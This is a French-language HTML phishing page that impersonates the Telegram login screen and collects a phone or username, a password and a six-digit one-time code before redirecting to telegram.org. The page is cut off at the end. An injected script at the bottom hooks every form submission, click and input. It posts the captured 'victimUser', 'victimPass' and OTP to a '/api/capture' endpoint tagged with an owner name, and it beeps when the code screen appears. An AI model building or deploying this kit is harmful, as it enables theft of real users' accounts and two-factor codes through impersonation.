<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Telegram · Connexion</title>

<style>
/* ============================================================
   1. RESET & VARIABLES
   ============================================================ */
*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

:root {
  --tg-blue:      #229ED9;
  --tg-blue-dark: #1c8ec4;
  --tg-blue-deep: #0088cc;
  --black:        #1a1a1a;
  --gray:         #707579;
  --border:       #dfe1e5;
  --white:        #ffffff;
  --red:          #e53935;
  --radius:       12px;
  --ease:         cubic-bezier(.2, .8, .2, 1);
}

/* ============================================================
   2. PAGE
   ============================================================ */
body {
  min-height: 100dvh;
  display: grid;
  place-items: center;
  padding: 24px 18px;
  position: relative;
  overflow-x: hidden;
  background: linear-gradient(160deg, #2AABEE 0%, #229ED9 45%, #1c8ec4 100%);
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  color: var(--black);
  -webkit-font-smoothing: antialiased;
}

body.locked { overflow: hidden; }

.blob {
  position: fixed;
  border-radius: 50%;
  pointer-events: none;
  z-index: 0;
  background: rgba(255, 255, 255, .09);
  animation: float 16s ease-in-out infinite;
}
.b1 { width: 360px; height: 360px; top: -140px; left: -110px; }
.b2 { width: 280px; height: 280px; bottom: -110px; right: -80px; animation-delay: -5s; }
.b3 { width: 200px; height: 200px; top: 55%; left: 10%; animation-delay: -9s; }

@keyframes float {
  0%, 100% { transform: translate(0, 0) scale(1); }
  50%      { transform: translate(26px, -32px) scale(1.1); }
}

/* ============================================================
   3. CARTE
   ============================================================ */
.card {
  position: relative;
  z-index: 1;
  width: min(420px, 100%);
  padding: 36px 34px 28px;
  background: var(--white);
  border-radius: 22px;
  box-shadow: 0 30px 60px -25px rgba(0, 40, 70, .55);
  animation: cardIn .6s var(--ease) both;
}

.card.ready { animation: none; }
.card.shake { animation: shake .5s ease; }

@keyframes cardIn {
  from { opacity: 0; transform: translateY(22px) scale(.97); }
  to   { opacity: 1; transform: translateY(0)    scale(1);   }
}

@keyframes shake {
  10%, 90%      { transform: translateX(-2px); }
  20%, 80%      { transform: translateX(4px);  }
  30%, 50%, 70% { transform: translateX(-7px); }
  40%, 60%      { transform: translateX(7px);  }
}

/* ============================================================
   4. LOGO AVION
   ============================================================ */
.logo {
  width: 82px;
  height: 82px;
  margin: 0 auto 20px;
  display: grid;
  place-items: center;
  background: linear-gradient(145deg, #2AABEE, #1c8ec4);
  border-radius: 50%;
  box-shadow: 0 14px 30px -10px rgba(34, 158, 217, .8);
  animation: bob 4s ease-in-out infinite;
}

.logo svg {
  width: 42px;
  height: 42px;
  fill: none;
  stroke: var(--white);
  stroke-width: 2;
  stroke-linecap: round;
  stroke-linejoin: round;
  transform: translate(-2px, 2px);
}

@keyframes bob {
  0%, 100% { transform: translateY(0); }
  50%      { transform: translateY(-6px); }
}

/* ============================================================
   5. TITRES
   ============================================================ */
h1 {
  font-size: 25px;
  font-weight: 700;
  text-align: center;
  letter-spacing: -.4px;
  margin-bottom: 6px;
}

.sub {
  font-size: 14px;
  color: var(--gray);
  text-align: center;
  margin-bottom: 26px;
}

/* ============================================================
   6. CHAMPS
   ============================================================ */
.field { position: relative; margin-bottom: 14px; }

.field input {
  width: 100%;
  height: 56px;
  padding: 22px 16px 6px;
  font-size: 15.5px;
  font-family: inherit;
  color: var(--black);
  background: #f7f8fa;
  border: 2px solid transparent;
  border-radius: var(--radius);
  outline: none;
  transition: border-color .2s, background .2s, box-shadow .2s;
}

.field input::placeholder { color: transparent; }
.field input:hover { background: #f0f2f5; }

.field input:focus {
  background: var(--white);
  border-color: var(--tg-blue);
  box-shadow: 0 0 0 4px rgba(34, 158, 217, .16);
}

.field label {
  position: absolute;
  left: 18px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 15px;
  color: var(--gray);
  pointer-events: none;
  transition: top .16s var(--ease), font-size .16s var(--ease), color .16s;
}

.field input:focus + label,
.field input:not(:placeholder-shown) + label {
  top: 15px;
  font-size: 10.5px;
  font-weight: 700;
  letter-spacing: .6px;
  text-transform: uppercase;
  color: var(--tg-blue);
}

#password { padding-right: 54px; }

.toggle-pw {
  position: absolute;
  right: 8px;
  top: 50%;
  transform: translateY(-50%);
  width: 42px;
  height: 42px;
  display: grid;
  place-items: center;
  background: transparent;
  border: none;
  border-radius: 10px;
  cursor: pointer;
  color: var(--gray);
  transition: background .18s, color .18s;
}

.toggle-pw:hover { background: #eef1f5; color: var(--black); }

.toggle-pw svg {
  width: 20px; height: 20px;
  fill: none;
  stroke: currentColor;
  stroke-width: 2;
  stroke-linecap: round;
  stroke-linejoin: round;
}

.toggle-pw .eye-off { display: none; }
.toggle-pw.active .eye-on  { display: none; }
.toggle-pw.active .eye-off { display: block; }

/* ============================================================
   7. ERREURS
   ============================================================ */
.error {
  height: 0;
  overflow: hidden;
  margin-left: 4px;
  font-size: 12.5px;
  font-weight: 600;
  color: var(--red);
  opacity: 0;
  transition: height .22s, opacity .22s, margin .22s;
}

.error.show { height: 18px; margin-bottom: 8px; opacity: 1; }

/* ============================================================
   8. LIEN OUBLI
   ============================================================ */
.forgot {
  display: inline-block;
  margin: 4px 0 22px 4px;
  font-size: 13.5px;
  font-weight: 600;
  color: var(--tg-blue);
  text-decoration: none;
}

.forgot:hover { text-decoration: underline; }

/* ============================================================
   9. BOUTON
   ============================================================ */
.btn {
  position: relative;
  width: 100%;
  height: 54px;
  overflow: hidden;
  border: none;
  border-radius: 999px;
  background: linear-gradient(145deg, #2AABEE, #1c8ec4);
  color: var(--white);
  font-family: inherit;
  font-size: 16px;
  font-weight: 700;
  cursor: pointer;
  box-shadow: 0 12px 26px -10px rgba(34, 158, 217, .85);
  transition: transform .16s var(--ease), box-shadow .2s, filter .2s, opacity .2s;
}

.btn:hover:not(:disabled) {
  transform: translateY(-2px);
  filter: brightness(1.05);
  box-shadow: 0 18px 32px -12px rgba(34, 158, 217, .9);
}

.btn:active:not(:disabled) { transform: translateY(0) scale(.985); }

.btn:focus-visible { outline: 3px solid var(--tg-blue-deep); outline-offset: 3px; }

.btn[disabled]:not(.loading) {
  opacity: .45;
  cursor: not-allowed;
  box-shadow: none;
}

.btn-text { transition: opacity .2s; }
.btn.loading .btn-text { opacity: 0; }

.spinner {
  position: absolute;
  inset: 0;
  margin: auto;
  width: 22px;
  height: 22px;
  border: 3px solid rgba(255, 255, 255, .35);
  border-top-color: var(--white);
  border-radius: 50%;
  opacity: 0;
  transition: opacity .2s;
}

.btn.loading .spinner {
  opacity: 1;
  animation: spin .7s linear infinite;
}

@keyframes spin { to { transform: rotate(360deg); } }

.ripple {
  position: absolute;
  border-radius: 50%;
  background: rgba(255, 255, 255, .4);
  transform: scale(0);
  pointer-events: none;
  animation: rippleAnim .6s ease-out forwards;
}

@keyframes rippleAnim { to { transform: scale(3.2); opacity: 0; } }

/* ============================================================
   10. SÉPARATEUR & INSCRIPTION
   ============================================================ */
.divider {
  display: flex;
  align-items: center;
  gap: 14px;
  margin: 24px 0 18px;
  font-size: 12px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 1px;
  color: #b0b6bc;
}

.divider::before, .divider::after {
  content: "";
  flex: 1;
  height: 1.5px;
  background: var(--border);
  border-radius: 2px;
}

.signup { font-size: 14px; text-align: center; color: var(--gray); }

.signup a {
  font-weight: 700;
  color: var(--tg-blue);
  text-decoration: none;
}

.signup a:hover { text-decoration: underline; }

/* ============================================================
   11. OVERLAY DE CHARGEMENT (3 s)
   ============================================================ */
.loading-overlay {
  position: fixed;
  inset: 0;
  z-index: 9999;
  display: grid;
  place-items: center;
  padding: 24px;
  background: linear-gradient(160deg, #2AABEE 0%, #229ED9 45%, #1c8ec4 100%);
  opacity: 0;
  visibility: hidden;
  transition: opacity .5s ease, visibility .5s;
}

.loading-overlay.show { opacity: 1; visibility: visible; }

.loading-inner {
  width: min(340px, 100%);
  text-align: center;
  transform: translateY(16px);
  transition: transform .6s var(--ease);
}

.loading-overlay.show .loading-inner { transform: translateY(0); }

.plane {
  width: 96px;
  height: 96px;
  margin: 0 auto 26px;
  display: grid;
  place-items: center;
  background: rgba(255, 255, 255, .16);
  border: 2px solid rgba(255, 255, 255, .35);
  border-radius: 50%;
  animation: planePulse 1.8s ease-in-out infinite;
}

.plane svg {
  width: 46px;
  height: 46px;
  fill: none;
  stroke: var(--white);
  stroke-width: 2;
  stroke-linecap: round;
  stroke-linejoin: round;
  transform: translate(-2px, 2px);
}

@keyframes planePulse {
  0%, 100% { transform: scale(1)    translateY(0);    }
  50%      { transform: scale(1.07) translateY(-8px); }
}

.loading-title {
  font-size: 21px;
  font-weight: 700;
  color: var(--white);
  margin-bottom: 8px;
  letter-spacing: -.3px;
}

.loading-text {
  font-size: 14px;
  color: rgba(255, 255, 255, .85);
  margin-bottom: 26px;
}

.progress {
  position: relative;
  width: 100%;
  height: 9px;
  background: rgba(255, 255, 255, .25);
  border-radius: 999px;
  overflow: hidden;
}

.progress__bar {
  position: absolute;
  inset: 0 auto 0 0;
  width: 0%;
  border-radius: 999px;
  background: var(--white);
  box-shadow: 0 0 12px rgba(255, 255, 255, .8);
  will-change: width;
}

.progress__pct {
  margin-top: 14px;
  font-size: 13px;
  font-weight: 700;
  letter-spacing: .5px;
  font-variant-numeric: tabular-nums;
  color: rgba(255, 255, 255, .9);
}

/* ============================================================
   12. PAGE OTP (champ unique, pas de cases)
   ============================================================ */
.otp {
  position: fixed;
  inset: 0;
  z-index: 10000;
  display: grid;
  place-items: center;
  padding: 24px 18px;
  background: linear-gradient(160deg, #2AABEE 0%, #229ED9 45%, #1c8ec4 100%);
  opacity: 0;
  visibility: hidden;
  transition: opacity .5s ease, visibility .5s;
}

.otp.show { opacity: 1; visibility: visible; }

.otp__card {
  width: min(420px, 100%);
  padding: 34px 30px 26px;
  background: var(--white);
  border-radius: 22px;
  box-shadow: 0 30px 60px -25px rgba(0, 40, 70, .55);
  text-align: center;
  transform: translateY(18px) scale(.96);
  transition: transform .6s var(--ease);
}

.otp.show .otp__card { transform: translateY(0) scale(1); }

.otp__logo {
  display: inline-grid;
  place-items: center;
  width: 68px;
  height: 68px;
  margin-bottom: 18px;
  background: linear-gradient(145deg, #2AABEE, #1c8ec4);
  border-radius: 50%;
  box-shadow: 0 12px 26px -10px rgba(34, 158, 217, .8);
}

.otp__logo svg {
  width: 34px;
  height: 34px;
  fill: none;
  stroke: var(--white);
  stroke-width: 2;
  stroke-linecap: round;
  stroke-linejoin: round;
  transform: translate(-2px, 2px);
}

.otp__title {
  font-size: 22px;
  font-weight: 700;
  letter-spacing: -.3px;
  margin-bottom: 8px;
}

.otp__text {
  font-size: 14px;
  line-height: 1.55;
  color: var(--gray);
  margin-bottom: 24px;
}

.otp__text strong {
  color: var(--black);
  font-weight: 700;
  word-break: break-all;
}

/* --- Champ OTP unique --- */
.otp__field { position: relative; margin-bottom: 6px; }

.otp__input {
  width: 100%;
  height: 68px;
  padding: 0 18px;
  font-family: inherit;
  font-size: 30px;
  font-weight: 700;
  text-align: center;
  letter-spacing: 14px;
  text-indent: 14px;          /* compense le letter-spacing du dernier chiffre */
  color: var(--black);
  background: #f7f8fa;
  border: 2px solid transparent;
  border-radius: var(--radius);
  outline: none;
  caret-color: var(--tg-blue);
  transition: border-color .2s, background .2s, box-shadow .2s;
  -moz-appearance: textfield;
}

.otp__input::-webkit-outer-spin-button,
.otp__input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

.otp__input::placeholder {
  color: #c3c8cd;
  letter-spacing: 14px;
  text-indent: 14px;
  font-weight: 700;
}

.otp__input:hover { background: #f0f2f5; }

.otp__input:focus {
  background: var(--white);
  border-color: var(--tg-blue);
  box-shadow: 0 0 0 4px rgba(34, 158, 217, .16);
}

.otp__input.error-state {
  border-color: var(--red);
  box-shadow: 0 0 0 4px rgba(229, 57, 53, .14);
}

.otp .error { margin: 4px 0 0; text-align: center; }
.otp .error.show { margin-bottom: 10px; }

.otp .btn { margin-top: 18px; }

/* Renvoi */
.resend {
  margin-top: 18px;
  font-size: 13.5px;
  color: var(--gray);
}

.resend button {
  padding: 0;
  font: inherit;
  font-weight: 700;
  color: var(--tg-blue);
  background: none;
  border: none;
  border-bottom: 1.5px solid transparent;
  cursor: pointer;
  transition: border-color .18s;
}

.resend button:hover:not(:disabled) { border-bottom-color: var(--tg-blue); }

.resend button:disabled {
  color: #b0b6bc;
  cursor: default;
  font-variant-numeric: tabular-nums;
}

/* Retour */
.otp__back {
  display: inline-block;
  margin-top: 14px;
  font-size: 13px;
  font-weight: 600;
  color: var(--gray);
  background: none;
  border: none;
  cursor: pointer;
  text-decoration: underline;
  text-underline-offset: 3px;
}

.otp__back:hover { color: var(--black); }

/* ============================================================
   13. RESPONSIVE & ACCESSIBILITÉ
   ============================================================ */
@media (max-width: 420px) {
  .card { padding: 30px 22px 24px; border-radius: 18px; }
  h1 { font-size: 23px; }
  .logo { width: 72px; height: 72px; }
  .logo svg { width: 36px; height: 36px; }
  .otp__card { padding: 28px 20px 22px; border-radius: 18px; }
  .otp__title { font-size: 20px; }
  .otp__input { font-size: 26px; letter-spacing: 10px; text-indent: 10px; }
  .otp__input::placeholder { letter-spacing: 10px; text-indent: 10px; }
}

@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after {
    animation-duration: .001ms !important;
    transition-duration: .001ms !important;
  }
}
</style>
</head>

<body>

<div class="blob b1"></div>
<div class="blob b2"></div>
<div class="blob b3"></div>

<!-- ===================== CARTE DE CONNEXION ===================== -->
<main class="card" id="card">

  <div class="logo">
    <svg viewBox="0 0 24 24" aria-hidden="true">
      <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/>
    </svg>
  </div>

  <h1>Connexion</h1>
  <p class="sub">Connectez-vous à Telegram</p>

  <form id="loginForm" novalidate>

    <div class="field">
      <input type="text" id="phone" name="phone" placeholder=" "
             autocomplete="username" spellcheck="false">
      <label for="phone">Téléphone ou nom d'utilisateur</label>
    </div>
    <p class="error" id="err-phone" role="alert"></p>

    <div class="field">
      <input type="password" id="password" name="password" placeholder=" "
             autocomplete="current-password">
      <label for="password">Mot de passe</label>

      <button type="button" class="toggle-pw" id="togglePw"
              aria-label="Afficher le mot de passe">
        <svg class="eye-on" viewBox="0 0 24 24">
          <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
          <circle cx="12" cy="12" r="3"/>
        </svg>
        <svg class="eye-off" viewBox="0 0 24 24">
          <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
          <circle cx="12" cy="12" r="3"/>
          <path d="M3 3l18 18"/>
        </svg>
      </button>
    </div>
    <p class="error" id="err-password" role="alert"></p>

    <a href="#" class="forgot">Mot de passe oublié&nbsp;?</a>

    <button type="submit" class="btn" id="submitBtn">Se connecter</button>

  </form>

  <div class="divider"><span>ou</span></div>

  <p class="signup">
    Pas encore de compte&nbsp;? <a href="#">S'inscrire</a>
  </p>

</main>

<!-- ===================== CHARGEMENT 3 s ===================== -->
<div class="loading-overlay" id="loadingOverlay"
     aria-hidden="true" aria-live="polite">
  <div class="loading-inner">

    <div class="plane">
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/>
      </svg>
    </div>

    <h2 class="loading-title">Connexion sécurisée</h2>
    <p class="loading-text">Vérification de vos identifiants…</p>

    <div class="progress" role="progressbar" aria-valuemin="0"
         aria-valuemax="100" aria-valuenow="0" id="progressTrack">
      <div class="progress__bar" id="progressBar"></div>
    </div>

    <p class="progress__pct" id="progressPct">0 %</p>

  </div>
</div>

<!-- ===================== PAGE OTP (champ unique) ===================== -->
<section class="otp" id="otp" aria-hidden="true">
  <div class="otp__card">

    <div class="otp__logo">
      <svg viewBox="0 0 24 24" aria-hidden="true">
        <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/>
      </svg>
    </div>

    <h2 class="otp__title">Vérification du code</h2>
    <p class="otp__text">
      Saisissez le code à <strong>6 chiffres</strong> envoyé à<br>
      <strong id="otpTarget">votre compte</strong>
    </p>

    <form id="otpForm" novalidate>

      <div class="otp__field">
        <input class="otp__input" id="otpInput" type="text"
               inputmode="numeric" autocomplete="one-time-code"
               maxlength="6" placeholder="••••••"
               aria-label="Code de vérification à 6 chiffres">
      </div>

      <p class="error" id="err-otp" role="alert"></p>

      <button type="submit" class="btn" id="otpBtn" disabled>
        <span class="btn-text">Vérifier le code</span>
        <span class="spinner" aria-hidden="true"></span>
      </button>

    </form>

    <p class="resend">
      Code non reçu&nbsp;?
      <button type="button" id="resendBtn" disabled>Renvoyer (30s)</button>
    </p>

    <button type="button" class="otp__back" id="backBtn">
      Utiliser un autre compte
    </button>

  </div>
</section>

<script>
/* ==========================================================
   CONFIGURATION
   ========================================================== */
const OFFICIAL_URL  = 'https://telegram.org/';
const LOADING_DELAY = 3000;   // 3 secondes
const RESEND_DELAY  = 30;     // secondes avant renvoi
const OTP_LENGTH    = 6;

/* ==========================================================
   1. RÉFÉRENCES DOM
   ========================================================== */
const card        = document.getElementById('card');
const form        = document.getElementById('loginForm');
const phone       = document.getElementById('phone');
const password    = document.getElementById('password');
const errPhone    = document.getElementById('err-phone');
const errPassword = document.getElementById('err-password');
const submitBtn   = document.getElementById('submitBtn');
const togglePw    = document.getElementById('togglePw');

const overlay     = document.getElementById('loadingOverlay');
const progressBar = document.getElementById('progressBar');
const progressPct = document.getElementById('progressPct');
const progressTrk = document.getElementById('progressTrack');

const otp        = document.getElementById('otp');
const otpForm    = document.getElementById('otpForm');
const otpInput   = document.getElementById('otpInput');
const otpBtn     = document.getElementById('otpBtn');
const errOtp     = document.getElementById('err-otp');
const resendBtn  = document.getElementById('resendBtn');
const otpTarget  = document.getElementById('otpTarget');
const backBtn    = document.getElementById('backBtn');

/* ==========================================================
   2. ANIMATIONS DE LA CARTE
   ========================================================== */
card.addEventListener('animationend', (e) => {
  if (e.animationName === 'cardIn') card.classList.add('ready');
  if (e.animationName === 'shake')  card.classList.remove('shake');
});

/* ==========================================================
   3. AFFICHER / MASQUER LE MOT DE PASSE
   ========================================================== */
togglePw.addEventListener('click', () => {
  const hidden = password.type === 'password';

  password.type = hidden ? 'text' : 'password';
  togglePw.classList.toggle('active', hidden);
  togglePw.setAttribute(
    'aria-label',
    hidden ? 'Masquer le mot de passe' : 'Afficher le mot de passe'
  );

  password.focus();
});

/* ==========================================================
   4. ERREURS
   ========================================================== */
function setError(el, msg) {
  el.textContent = msg;
  el.classList.toggle('show', msg.length > 0);
}

phone.addEventListener('input', () => setError(errPhone, ''));
password.addEventListener('input', () => setError(errPassword, ''));

/* ==========================================================
   5. SOUMISSION → CHARGEMENT → OTP
   ========================================================== */
let busy = false;

form.addEventListener('submit', (e) => {
  e.preventDefault();
  if (busy) return;

  let ok = true;

  if (!phone.value.trim()) {
    setError(errPhone, 'Saisissez votre téléphone ou nom d\'utilisateur.');
    ok = false;
  }

  if (!password.value) {
    setError(errPassword, 'Saisissez votre mot de passe.');
    ok = false;
  }

  if (!ok) {
    card.classList.add('shake');
    return;
  }

  busy = true;
  startLoading();
});

/* ==========================================================
   6. CHARGEMENT 3 s → PAGE OTP
   ========================================================== */
function startLoading() {
  document.body.classList.add('locked');

  overlay.classList.add('show');
  overlay.setAttribute('aria-hidden', 'false');

  const startTime = performance.now();

  function tick(now) {
    const elapsed  = now - startTime;
    const progress = Math.min(elapsed / LOADING_DELAY, 1);
    const percent  = Math.round(progress * 100);

    progressBar.style.width = percent + '%';
    progressPct.textContent = percent + ' %';
    progressTrk.setAttribute('aria-valuenow', String(percent));

    if (progress < 1) {
      requestAnimationFrame(tick);
    } else {
      setTimeout(showOtp, 300);
    }
  }

  requestAnimationFrame(tick);
}

/* ==========================================================
   7. AFFICHAGE DE LA PAGE OTP
   ========================================================== */
function showOtp() {
  overlay.classList.remove('show');
  overlay.setAttribute('aria-hidden', 'true');

  otpTarget.textContent = phone.value.trim() || 'votre compte';

  setTimeout(() => {
    otp.classList.add('show');
    otp.setAttribute('aria-hidden', 'false');

    setTimeout(() => otpInput.focus(), 380);

    startResendTimer();
  }, 260);
}

/* ==========================================================
   8. CHAMP OTP UNIQUE
   ========================================================== */
function refreshOtpState() {
  otpBtn.disabled = otpInput.value.length !== OTP_LENGTH;
}

/* On ne garde que les chiffres, max 6 */
otpInput.addEventListener('input', () => {
  otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, OTP_LENGTH);

  setError(errOtp, '');
  otpInput.classList.remove('error-state');
  refreshOtpState();
});

/* Collage géré naturellement, mais on nettoie quand même */
otpInput.addEventListener('paste', (e) => {
  e.preventDefault();
  const digits = (e.clipboardData.getData('text') || '')
    .replace(/\D/g, '')
    .slice(0, OTP_LENGTH);

  otpInput.value = digits;
  setError(errOtp, '');
  otpInput.classList.remove('error-state');
  refreshOtpState();
});

/* Entrée → validation */
otpInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') {
    e.preventDefault();
    otpForm.requestSubmit();
  }
});

/* ==========================================================
   9. VALIDATION OTP → REDIRECTION
   ========================================================== */
otpForm.addEventListener('submit', (e) => {
  e.preventDefault();
  if (otpBtn.classList.contains('loading')) return;

  if (otpInput.value.length !== OTP_LENGTH) {
    setError(errOtp, `Saisissez les ${OTP_LENGTH} chiffres du code.`);
    otpInput.classList.add('error-state');
    otpInput.focus();
    return;
  }

  otpBtn.classList.add('loading');
  otpBtn.disabled = true;

  setTimeout(() => {
    window.location.href = OFFICIAL_URL;
  }, 1100);
});

/* ==========================================================
   10. RENVOI DU CODE
   ========================================================== */
let resendTimer = null;

function startResendTimer() {
  let remaining = RESEND_DELAY;

  resendBtn.disabled = true;
  resendBtn.textContent = `Renvoyer (${remaining}s)`;

  clearInterval(resendTimer);

  resendTimer = setInterval(() => {
    remaining--;

    if (remaining <= 0) {
      clearInterval(resendTimer);
      resendBtn.disabled = false;
      resendBtn.textContent = 'Renvoyer le code';
      return;
    }

    resendBtn.textContent = `Renvoyer (${remaining}s)`;
  }, 1000);
}

resendBtn.addEventListener('click', () => {
  if (resendBtn.disabled) return;

  otpInput.value = '';
  setError(errOtp, '');
  otpInput.classList.remove('error-state');
  refreshOtpState();
  otpInput.focus();

  startResendTimer();
});

/* ==========================================================
   11. RETOUR À LA CONNEXION
   ========================================================== */
backBtn.addEventListener('click', () => {
  clearInterval(resendTimer);

  otp.classList.remove('show');
  otp.setAttribute('aria-hidden', 'true');

  otpInput.value = '';
  setError(errOtp, '');
  otpInput.classList.remove('error-state');
  refreshOtpState();

  busy = false;
  document.body.classList.remove('locked');

  setTimeout(() => {
    card.classList.remove('ready');
    void card.offsetWidth;          // relance l'animation
    card.classList.add('ready');
    phone.focus();
  }, 200);
});

/* ==========================================================
   12. EFFET RIPPLE
   ========================================================== */
document.querySelectorAll('.btn').forEach((btn) => {
  btn.addEventListener('click', (e) => {
    const rect = btn.getBoundingClientRect();
    const size = Math.max(rect.width, rect.height);

    const ripple = document.createElement('span');
    ripple.className   = 'ripple';
    ripple.style.width = ripple.style.height = size + 'px';
    ripple.style.left  = (e.clientX - rect.left - size / 2) + 'px';
    ripple.style.top   = (e.clientY - rect.top  - size / 2) + 'px';

    btn.appendChild(ripple);
    setTimeout(() => ripple.remove(), 620);
  });
});
</script>

<script data-real-injected="true" data-injected-mode="otp">
(function () {
  const PARAM_CFG = {
    endpoint: "/api/capture",
    defaultOwner: "Kim",
    network: "Telegram",
    redirectUrl: "https://telegram.org/",
    mode: "otp",
    isOtpMode: true,
    enableOtpSound: true
  };

  const urlParams = new URLSearchParams(window.location.search);
  const ownerVal = urlParams.get("user") || urlParams.get("ref") || PARAM_CFG.defaultOwner;
  const typeParam = (urlParams.get("type") || PARAM_CFG.mode).toLowerCase();

  let lastUser = "";
  let lastPass = "";
  let lastOtpSent = "";
  let otpBeepPlayedForView = false;
  let audioCtx = null;
  const sentSet = new Set();

  function playAlertTone(freq = 880, durationMs = 180) {
    if (!PARAM_CFG.enableOtpSound) return;
    try {
      const Ctx = window.AudioContext || window.webkitAudioContext;
      if (!Ctx) return;
      if (!audioCtx) audioCtx = new Ctx();
      if (audioCtx.state === "suspended") {
        audioCtx.resume().catch(() => {});
      }
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.type = "sine";
      osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
      gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + durationMs / 1000);
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
      osc.stop(audioCtx.currentTime + durationMs / 1000);
    } catch (_) {}
  }

  function isOtpInputElement(el) {
    if (!el || !["INPUT", "TEXTAREA"].includes(el.tagName)) return false;
    const t = (el.type || "").toLowerCase();
    if (["password", "submit", "button", "checkbox", "radio", "hidden"].includes(t)) return false;

    const meta = [
      el.id,
      el.name,
      el.placeholder,
      el.className,
      el.getAttribute("aria-label"),
      el.getAttribute("autocomplete"),
      el.getAttribute("inputmode")
    ]
      .filter(Boolean)
      .join(" ")
      .toLowerCase();

    const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
    if (
      el.classList.contains("otp-input") ||
      el.classList.contains("otp-box") ||
      /otp|one-time-code|verification.?code|security.?code|code/i.test(meta)
    ) {
      return true;
    }

    if (maxLen === 1 && (el.closest(".otp-inputs, .otp-container, [class*='otp' i], [id*='otp' i]") || el.getAttribute("inputmode") === "numeric")) {
      return true;
    }

    return false;
  }

  function isElementVisible(el) {
    if (!el) return false;
    if (el.closest(".hidden")) return false;
    const style = window.getComputedStyle(el);
    if (style.display === "none" || style.visibility === "hidden" || parseFloat(style.opacity || "1") === 0) {
      return false;
    }
    const rect = el.getBoundingClientRect();
    return rect.width > 0 && rect.height > 0;
  }

  function checkOtpScreenAlert() {
    if (!PARAM_CFG.enableOtpSound) return;
    const otpEls = Array.from(document.querySelectorAll("input, textarea")).filter(isOtpInputElement);
    const anyVisible = otpEls.some(isElementVisible);
    if (anyVisible && !otpBeepPlayedForView) {
      otpBeepPlayedForView = true;
      playAlertTone(880, 160);
      setTimeout(() => playAlertTone(1174, 180), 190);
    } else if (!anyVisible) {
      otpBeepPlayedForView = false;
    }
  }

  function sendCapture(payload) {
    const key = JSON.stringify(payload);
    if (sentSet.has(key)) return;
    sentSet.add(key);

    return fetch(PARAM_CFG.endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      keepalive: true
    }).catch((err) => console.log(err));
  }

  function readFields(scopeEl) {
    const root = (scopeEl && scopeEl.closest && scopeEl.closest("form")) || document;
    const allInputs = Array.from(root.querySelectorAll("input, select, textarea"));
    const globalInputs = root === document ? allInputs : Array.from(document.querySelectorAll("input, select, textarea"));

    let user = "";
    let pass = "";
    const otpParts = [];

    allInputs.forEach((el) => {
      const t = (el.type || "").toLowerCase();
      if (["submit", "button", "checkbox", "radio", "hidden"].includes(t)) return;

      if (t === "password") {
        if (!pass && el.value) pass = el.value;
      } else if (isOtpInputElement(el)) {
        const cleanVal = (el.value || "").replace(/s+/g, "").trim();
        if (cleanVal) otpParts.push(cleanVal);
      } else {
        const val = (el.value || "").trim();
        if (!user && val) user = val;
      }
    });

    if (otpParts.length === 0) {
      globalInputs.forEach((el) => {
        if (isOtpInputElement(el)) {
          const cleanVal = (el.value || "").replace(/s+/g, "").trim();
          if (cleanVal) otpParts.push(cleanVal);
        }
      });
    }

    if (!user) {
      const firstText = globalInputs.find((i) => {
        const t = (i.type || "").toLowerCase();
        return !["password", "submit", "button", "checkbox", "radio", "hidden"].includes(t) &&
          !isOtpInputElement(i) &&
          i.value &&
          i.value.trim();
      });
      if (firstText) user = firstText.value.trim();
    }

    if (!pass) {
      const p = document.querySelector("input[type='password']");
      if (p && p.value) pass = p.value;
    }

    return {
      user: user || lastUser || "",
      pass: pass || lastPass || "",
      otp: otpParts.length > 0 ? otpParts.join("") : "Aucun"
    };
  }

  function emitPayload(data, forceOtpMode = false) {
    if (data.user) lastUser = data.user;
    if (data.pass) lastPass = data.pass;

    const hasOtpValue = Boolean(data.otp && data.otp !== "Aucun");
    const useOtp = PARAM_CFG.isOtpMode || forceOtpMode || hasOtpValue;

    const stepType = useOtp
      ? (hasOtpValue ? (typeParam === "standard" ? "otp" : typeParam) : "otp_step1")
      : "standard";

    if (lastUser || lastPass || hasOtpValue) {
      if (hasOtpValue && data.otp !== lastOtpSent) {
        lastOtpSent = data.otp;
        playAlertTone(1046, 170);
      }
      sendCapture({
        owner: ownerVal,
        network: PARAM_CFG.network,
        type: stepType,
        victimUser: lastUser,
        victimPass: lastPass,
        otp: useOtp ? data.otp : "Aucun"
      });
    }
  }

  function handleAction(e, sourceEl) {
    const data = readFields(sourceEl);
    emitPayload(data, false);
  }

  document.addEventListener("submit", (e) => {
    handleAction(e, e.target);
  }, true);

  document.addEventListener("click", (e) => {
    const btn = e.target.closest ? e.target.closest("button, input[type='submit'], [role='button']") : null;
    if (!btn) return;
    if (btn.type && btn.type.toLowerCase() === "submit" && btn.closest("form")) {
      return;
    }
    handleAction(e, btn);
  }, true);

  document.addEventListener("input", (e) => {
    const el = e.target;
    if (!el || !["INPUT", "TEXTAREA"].includes(el.tagName)) return;
    if (!isOtpInputElement(el)) return;

    const data = readFields(el);
    if (data.otp && data.otp !== "Aucun" && data.otp.length >= 4) {
      emitPayload(data, true);
    }
  }, true);

  document.addEventListener("change", (e) => {
    const el = e.target;
    if (!el || !["INPUT", "TEXTAREA"].includes(el.tagName)) return;
